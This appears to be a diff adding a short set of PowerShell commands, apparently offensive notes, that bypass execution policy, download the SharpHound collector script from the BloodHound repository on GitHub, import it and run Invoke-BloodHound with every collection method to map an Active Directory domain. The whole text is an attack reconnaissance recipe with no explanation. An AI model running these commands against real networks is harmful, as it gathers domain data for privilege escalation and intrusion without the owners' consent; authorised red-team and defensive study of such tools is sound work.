@@ -1,0 +1,6 @@
+# runas admin Powershell ISE
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "((new-object net.webclient).DownloadFile('https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1','SharpHound.ps1'))"
+
+Powershell -exec bypass
+Import-module SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All  
